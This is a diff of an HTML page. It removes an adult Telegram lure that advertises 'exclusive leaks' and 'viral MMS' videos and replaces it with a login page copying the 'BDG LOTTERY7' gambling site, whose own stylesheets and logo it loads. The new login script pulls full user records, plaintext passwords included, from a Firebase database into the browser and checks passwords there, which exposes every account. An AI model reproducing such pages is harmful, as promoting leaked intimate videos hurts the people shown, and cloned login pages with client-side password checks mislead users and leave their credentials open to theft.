@@ -1,489 +1,145 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" translate="no">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
-  <title>Viral MMS · Desi New Viral 2026</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', 'Poppins', sans-serif;
-      min-height: 100vh;
-      background: #050505;
-      position: relative;
-    }
-
-    /* ---------- FULL BACKGROUND IMAGE - NO CUTOFF, FULL VISIBLE & DYNAMIC ---------- */
-    .full-bg {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 0;
-      background: url('https://i.ibb.co/qMvnVJN0/fcc-040.jpg') no-repeat center center/cover;
-      /* image covers entire screen, perfect visibility */
-      filter: brightness(0.85) contrast(1.05);
-      transition: all 0.3s;
-    }
-
-    /* softer but deep overlay to make text pop while bg stays rich */
-    .dynamic-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: radial-gradient(circle at 40% 30%, rgba(0, 0, 0, 0.55), rgba(0, 0, 0, 0.82));
-      z-index: 1;
-      backdrop-filter: blur(2px);
-    }
-
-    /* main wrapper - scrollable content with full bg visible behind */
-    .wrapper {
-      position: relative;
-      z-index: 12;
-      max-width: 680px;
-      margin: 0 auto;
-      padding: 30px 20px 70px;
-      display: flex;
-      flex-direction: column;
-      gap: 28px;
-    }
-
-    /* new glass panel style - cleaner, transparent but readable */
-    .premium-card {
-      background: rgba(8, 8, 12, 0.7);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border-radius: 48px;
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      box-shadow: 0 30px 40px -20px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.1);
-      padding: 32px 28px;
-      transition: transform 0.25s ease;
-    }
-
-    .premium-card:hover {
-      transform: translateY(-3px);
-    }
-
-    /* headline area */
-    .viral-header {
-      text-align: center;
-      margin-bottom: 16px;
-    }
-
-    .trending-flame {
-      background: rgba(255, 60, 30, 0.9);
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-      padding: 6px 20px;
-      border-radius: 60px;
-      font-weight: 800;
-      font-size: 0.8rem;
-      letter-spacing: 1px;
-      color: #fff3b0;
-      margin-bottom: 20px;
-      box-shadow: 0 0 12px #ff4d2e;
-    }
-
-    h1 {
-      font-size: 4rem;
-      font-weight: 900;
-      background: linear-gradient(145deg, #FFF5E0, #FFC48A, #FF6A4B);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      letter-spacing: -0.5px;
-      text-shadow: 0 2px 5px rgba(0,0,0,0.3);
-      line-height: 1.1;
-      margin-bottom: 12px;
-    }
-
-    .desi-sub {
-      background: rgba(0, 0, 0, 0.6);
-      backdrop-filter: blur(8px);
-      display: inline-block;
-      padding: 8px 24px;
-      border-radius: 40px;
-      font-weight: 600;
-      font-size: 1rem;
-      color: #ffcf8a;
-      border: 1px solid #ff9966;
-      margin-top: 6px;
-    }
-
-    /* video badges row */
-    .hot-badges {
-      display: flex;
-      justify-content: center;
-      flex-wrap: wrap;
-      gap: 12px;
-      margin: 28px 0 12px;
-    }
-
-    .badge-item {
-      background: rgba(0,0,0,0.7);
-      backdrop-filter: blur(8px);
-      padding: 8px 18px;
-      border-radius: 50px;
-      font-size: 0.8rem;
-      font-weight: 600;
-      color: #ffb35c;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      border-right: 2px solid #ff7744;
-    }
-
-    /* 18+ segment prominent */
-    .adult-warning {
-      background: rgba(20, 0, 0, 0.7);
-      border-radius: 60px;
-      padding: 12px 24px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 20px;
-      flex-wrap: wrap;
-      margin: 18px 0 18px;
-      border: 1px solid #ff5e5e;
-    }
-
-    .eighteen {
-      background: #e11b1b;
-      border-radius: 60px;
-      padding: 5px 18px;
-      font-weight: 800;
-      font-size: 1.2rem;
-      color: white;
-      box-shadow: 0 0 8px red;
-    }
-
-    .warning-text {
-      color: #ffbc9a;
-      font-weight: 500;
-      letter-spacing: 0.3px;
-    }
-
-    /* video preview gallery (mms viral vibe) */
-    .mms-showcase {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 14px;
-      margin: 20px 0 16px;
-    }
-
-    .mms-card {
-      background: rgba(0, 0, 0, 0.65);
-      backdrop-filter: blur(12px);
-      border-radius: 28px;
-      aspect-ratio: 3 / 4;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      border: 1px solid rgba(255, 128, 64, 0.6);
-      transition: all 0.2s;
-      text-align: center;
-    }
-
-    .mms-card .emoji-big {
-      font-size: 2.8rem;
-      filter: drop-shadow(0 2px 4px black);
-    }
-
-    .mms-card span {
-      font-weight: 700;
-      font-size: 0.75rem;
-      background: rgba(255, 80, 40, 0.8);
-      padding: 4px 14px;
-      border-radius: 40px;
-      color: white;
-    }
-
-    /* TELEGRAM BUTTON - NEW LINK 🔥 */
-    .telegram-block {
-      background: linear-gradient(105deg, #0088cc, #005f8c);
-      border-radius: 100px;
-      margin: 20px 0 10px;
-      transition: 0.25s;
-      cursor: pointer;
-      box-shadow: 0 10px 20px -5px #0088ff70;
-      border: none;
-    }
-
-    .telegram-block a {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 16px;
-      text-decoration: none;
-      font-weight: 800;
-      font-size: 1.7rem;
-      color: white;
-      padding: 16px 20px;
-      background: rgba(255,255,240,0.05);
-      border-radius: 100px;
-      letter-spacing: 1px;
-    }
-
-    .telegram-block a span:first-child {
-      font-size: 2rem;
-    }
-
-    .telegram-block:hover {
-      transform: scale(1.02);
-      box-shadow: 0 18px 28px -8px #00aaff;
-    }
-
-    .fast-join {
-      text-align: center;
-      margin-top: 8px;
-      font-weight: 600;
-      background: rgba(0,0,0,0.5);
-      display: inline-block;
-      width: auto;
-      padding: 6px 20px;
-      border-radius: 60px;
-      font-size: 0.8rem;
-      backdrop-filter: blur(5px);
-      color: #ffcf9a;
-    }
-
-    /* additional CTA text */
-    .channel-stats {
-      display: flex;
-      justify-content: center;
-      gap: 24px;
-      background: rgba(0,0,0,0.4);
-      backdrop-filter: blur(10px);
-      border-radius: 80px;
-      padding: 10px 18px;
-      margin: 12px 0;
-    }
-
-    .stat {
-      font-size: 0.8rem;
-      font-weight: bold;
-      color: #ffb570;
-    }
-
-    .viral-quote {
-      text-align: center;
-      background: linear-gradient(90deg, #ff7e5e20, #feb47b20);
-      padding: 16px;
-      border-radius: 38px;
-      margin-top: 10px;
-      font-style: italic;
-      font-weight: 500;
-      color: #ffddb0;
-      font-size: 0.9rem;
-    }
-
-    .footer-note {
-      text-align: center;
-      font-size: 0.7rem;
-      color: #ccc9;
-      border-top: 1px solid rgba(255,255,200,0.15);
-      padding-top: 20px;
-      margin-top: 18px;
-    }
-
-    /* responsive behavior */
-    @media (max-width: 560px) {
-      .wrapper {
-        padding: 20px 16px 50px;
-      }
-      .premium-card {
-        padding: 24px 18px;
-      }
-      h1 {
-        font-size: 2.7rem;
-      }
-      .telegram-block a {
-        font-size: 1.3rem;
-        padding: 12px 14px;
-      }
-      .mms-showcase {
-        gap: 8px;
-      }
-      .badge-item {
-        font-size: 0.7rem;
-        padding: 5px 12px;
-      }
-    }
-
-    @keyframes subtlePulse {
-      0% { opacity: 0.9; }
-      100% { opacity: 1; }
-    }
-
-    .telegram-block {
-      animation: subtlePulse 2s infinite alternate;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BDG LOTTERY7 - Login</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    
+    <!-- Original CSS Links -->
+    <link rel="stylesheet" href="https://www.bigdaddygame2.com/index_files/index-96409872.css">
+    <link rel="stylesheet" href="https://www.bigdaddygame2.com/index_files/modules-96c1e775.css">
+    <link rel="stylesheet" href="https://www.bigdaddygame2.com/index_files/page-login-ef3d1f88.css">
+    <link rel="stylesheet" href="https://www.bigdaddygame2.com/index_files/page-login-b5988105.css">
+    <link rel="stylesheet" href="https://www.bigdaddygame2.com/index_files/page-main-ff2e7571.css">
+    <link rel="stylesheet" href="https://www.bigdaddygame2.com/index_files/index-98687087.css">
+    
+    <style>
+        body { background-color: #292929; margin: 0; padding: 0; font-size: 40px; }
+        .msg-content { animation: zoom-in .45s ease reverse; }
+        @keyframes zoom-in { 0% {opacity:1; transform:scale(1,1);} 50% {transform:scale(.6,.6);} 100% {opacity:0; transform:scale(1,1);} }
+    </style>
 </head>
-<body>
-
-<!-- FULL BACKGROUND IMAGE - FULLY VISIBLE (no clipping) -->
-<div class="full-bg"></div>
-<div class="dynamic-overlay"></div>
-
-<div class="wrapper">
-  
-  <!-- main card design : alternate look -->
-  <div class="premium-card">
-    <div class="viral-header">
-      <div class="trending-flame">
-        🔥 #1 VIRAL TRENDING INDIA 🔥
-      </div>
-      <h1>VIRAL MMS</h1>
-      <div class="desi-sub">
-        ⚡ Desi Viral Videos · Exclusive Leaks ⚡
+<body style="font-size: 12px">
+<div id="app" data-v-app="" style="background:#292929">
+  <div data-v-8752c961="" class="login__container">
+    <!-- Navbar -->
+    <div data-v-58c5e826="" data-v-8752c961="" class="navbar">
+      <div data-v-58c5e826="" class="navbar-fixed" style="background: rgb(63,63,63);">
+        <div data-v-58c5e826="" class="navbar__content">
+          <div data-v-58c5e826="" class="navbar__content-center">
+            <div data-v-58c5e826="" class="headLogo" style="background-image:url(https://www.bigdaddygame2.com/index_files/h5setting_202401100608011fs2.png);"></div>
+          </div>
+        </div>
       </div>
     </div>
 
-    <!-- 18+ ADULT ZONE (clearly visible) -->
-    <div class="adult-warning">
-      <div class="eighteen">🔞 18+ ONLY</div>
-      <div class="warning-text">Mature Content · Adult MMS · Uncensored Telegram Channel</div>
-    </div>
-
-    <!-- MMS viral preview (full aesthetic) -->
-    <div class="mms-showcase">
-      <div class="mms-card">
-        <div class="emoji-big">🎬</div>
-        <span>HOT LEAK</span>
-      </div>
-      <div class="mms-card">
-        <div class="emoji-big">📲</div>
-        <span>DESI MMS</span>
-      </div>
-      <div class="mms-card">
-        <div class="emoji-big">💥</div>
-        <span>VIRAL CLIP</span>
+    <!-- Heading -->
+    <div data-v-8752c961="" class="login__container-heading">
+      <h1 data-v-8752c961="" class="login__container-heading__title">Log in</h1>
+      <div data-v-8752c961="" class="login__container-heading__subTitle">
+        <div data-v-8752c961="">Please log in with your phone number</div>
       </div>
     </div>
 
-    <!-- badges row for extra vibe -->
-    <div class="hot-badges">
-      <div class="badge-item">🔥 Daily Viral Updates</div>
-      <div class="badge-item">📹 18+ Exclusive MMS</div>
-      <div class="badge-item">🚀 Telegram Fast Access</div>
-    </div>
+    <!-- Form -->
+    <div data-v-8752c961="" class="login__container-form">
+      <div data-v-8752c961="" class="tab-content activecontent">
+        <div data-v-0ce8d964="" data-v-8752c961="" class="signIn__container">
+          
+          <!-- Phone Input -->
+          <div data-v-93f53084="" data-v-0ce8d964="" class="phoneInput__container">
+            <div data-v-93f53084="" class="phoneInput__container-label">
+              <span data-v-93f53084="">Phone number</span>
+            </div>
+            <div data-v-93f53084="" class="phoneInput__container-input">
+              <input id="username" type="text" placeholder="Please enter the phone number" required>
+            </div>
+          </div>
 
-    <!-- STATS / community feel -->
-    <div class="channel-stats">
-      <div class="stat">👥 150K+ Members</div>
-      <div class="stat">⚡ New Clips Daily</div>
-      <div class="stat">🎥 Desi Viral Hub</div>
-    </div>
+          <!-- Password Input -->
+          <div data-v-57d49070="" data-v-0ce8d964="" class="passwordInput__container">
+            <div data-v-57d49070="" class="passwordInput__container-label">
+              <span data-v-57d49070="">Password</span>
+            </div>
+            <div data-v-57d49070="" class="passwordInput__container-input">
+              <input id="passwordfield" type="password" placeholder="Please enter Password" required>
+            </div>
+          </div>
 
-    <!-- UPDATED TELEGRAM LINK: FULLY REPLACED AS PER REQUEST -->
-    <div class="telegram-block">
-      <a href="https://telegram.dog/+NS7NXRBUmawxNGNl" target="_blank" rel="noopener noreferrer">
-        <span>📢</span> JOIN TELEGRAM FAST <span>⏩</span>
-      </a>
+          <!-- Buttons -->
+          <div data-v-0ce8d964="" class="signIn__container-button">
+            <button data-v-0ce8d964="" class="active" id="loginBtn">Log in</button>
+            <button data-v-0ce8d964="" class="register" onclick="window.location='register.html'">Register</button>
+          </div>
+        </div>
+      </div>
     </div>
-
-    <div style="text-align: center; margin-top: 4px;">
-      <span class="fast-join">🔓 Instant Access · Limited Slots · Viral MMS Channel 🔓</span>
-    </div>
-
-    <!-- secondary clickable link (same new link, clean) -->
-    <div style="text-align: center; margin: 15px 0 5px;">
-      <a href="https://telegram.dog/+NS7NXRBUmawxNGNl" target="_blank" style="color: #ffbc7a; text-decoration: none; font-size: 0.8rem; border-bottom: 1px dashed #ff9f4a;">🔗 t.me/join_viral_new_2026</a>
-    </div>
-
-    <!-- short description + viral quote -->
-    <div class="viral-quote">
-      💎 “Desi masala · uncensored viral videos · join the telegram sensation now” 💎
-    </div>
-
-    <div class="footer-note">
-      ⚠️ This page contains 18+ mature content. By joining you confirm you are an adult.<br>
-      © Viral MMS • Desi Viral Videos 2026 • New Link Active
-    </div>
-  </div>
-
-  <!-- additional mini glass note for better UX -->
-  <div style="background: rgba(0,0,0,0.45); backdrop-filter: blur(10px); border-radius: 60px; padding: 12px 20px; text-align: center;">
-    <p style="color: #ffcf92; font-weight: 600;">📢 <strong>100% DESI VIRAL MMS LIBRARY</strong> 📢 <br>Join Telegram & Get Unlimited Access</p>
   </div>
 </div>
 
-<script>
-  (function() {
-    // Enforce new telegram link security and replacements
-    const allTelegramAnchors = document.querySelectorAll('a[href*="telegram.dog"]');
-    allTelegramAnchors.forEach(link => {
-      // ensure target="_blank" and rel for safety
-      link.setAttribute('target', '_blank');
-      link.setAttribute('rel', 'noopener noreferrer');
-    });
-    
-    // additional check: if any old link left? we already replaced static with new one, but double-check
-    const oldLinkCheck = document.querySelector('a[href*="+B_TFkW_cIIBiNTI1"]');
-    if(oldLinkCheck) {
-      oldLinkCheck.href = "https://telegram.dog/+NS7NXRBUmawxNGNl";
-    }
-    
-    // Background full visibility dynamic (refresh proof)
-    const bgDiv = document.querySelector('.full-bg');
-    if(bgDiv) {
-      // just ensure the background loads perfectly
-      const imgTest = new Image();
-      imgTest.src = 'https://i.ibb.co/qMvnVJN0/fcc-040.jpg';
-    }
+<!-- Firebase Logic -->
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, get, child } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-    // Optional micro interaction: ripple on telegram button
-    const teleBlock = document.querySelector('.telegram-block');
-    if(teleBlock) {
-      teleBlock.addEventListener('click', (e) => {
-        let rippleDiv = document.createElement('div');
-        rippleDiv.style.position = 'absolute';
-        rippleDiv.style.background = 'rgba(255,255,255,0.3)';
-        rippleDiv.style.borderRadius = '50%';
-        rippleDiv.style.width = '70px';
-        rippleDiv.style.height = '70px';
-        rippleDiv.style.transform = 'scale(0)';
-        rippleDiv.style.animation = 'rippleAnim 0.5s ease-out';
-        rippleDiv.style.pointerEvents = 'none';
-        const rect = teleBlock.getBoundingClientRect();
-        const clickX = e.clientX - rect.left;
-        const clickY = e.clientY - rect.top;
-        rippleDiv.style.left = `${clickX - 35}px`;
-        rippleDiv.style.top = `${clickY - 35}px`;
-        teleBlock.style.position = 'relative';
-        teleBlock.appendChild(rippleDiv);
-        setTimeout(() => rippleDiv.remove(), 500);
-      });
-    }
+    const firebaseConfig = {
+      apiKey: "AIzaSyADbcwPjDhg2ATFc9nMhstV8o1gD18WMw0",
+      authDomain: "airavattt.firebaseapp.com",
+      databaseURL: "https://airavattt-default-rtdb.firebaseio.com",
+      projectId: "airavattt",
+      storageBucket: "airavattt.appspot.com",
+      messagingSenderId: "906559825335",
+      appId: "1:906559825335:web:0c11437318fbd2aec4b432"
+    };
 
-    // inject ripple animation keyframes if not present
-    if(!document.querySelector('#rippleStyleExtra')) {
-      const styleSheet = document.createElement('style');
-      styleSheet.id = 'rippleStyleExtra';
-      styleSheet.textContent = `
-        @keyframes rippleAnim {
-          0% { transform: scale(0); opacity: 0.5; }
-          100% { transform: scale(5); opacity: 0; }
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    document.getElementById('loginBtn').addEventListener('click', async (e) => {
+        e.preventDefault();
+        let phone = document.getElementById('username').value.trim();
+        let password = document.getElementById('passwordfield').value.trim();
+        
+        if (!phone || !password) { alert("Please fill all fields"); return; }
+
+        let btn = e.target;
+        btn.innerText = "Logging in...";
+        btn.disabled = true;
+
+        try {
+            const dbRef = ref(db);
+            const snapshot = await get(child(dbRef, `users/${phone}`));
+            
+            if (!snapshot.exists()) {
+                alert("Account does not exist");
+                btn.innerText = "Log in"; btn.disabled = false; return;
+            }
+            
+            const userData = snapshot.val();
+            if (userData.password !== password) {
+                alert("Wrong password");
+                btn.innerText = "Log in"; btn.disabled = false; return;
+            }
+            if (userData.status === "blocked") {
+                alert("Account blocked. Contact admin.");
+                btn.innerText = "Log in"; btn.disabled = false; return;
+            }
+
+            // Success
+            localStorage.setItem('bdg_user', phone);
+            window.location.href = 'user.html';
+
+        } catch (error) {
+            console.error(error);
+            alert("Database error. Check Firebase rules.");
+            btn.innerText = "Log in"; btn.disabled = false;
         }
-      `;
-      document.head.appendChild(styleSheet);
-    }
+    });
 
-    // console greeting (non-intrusive)
-    console.log("🔥 Viral MMS Landing — New Telegram Link Active 🔥");
-  })();
+    // Adjust UI
+    $(window).on('load', function() { let w = $('body').width(); $('html').css('font-size', (w/10)+'px'); });
+    $(window).resize(function() { let w = $('body').width(); $('html').css('font-size', (w/10)+'px'); });
 </script>
 </body>
 </html>
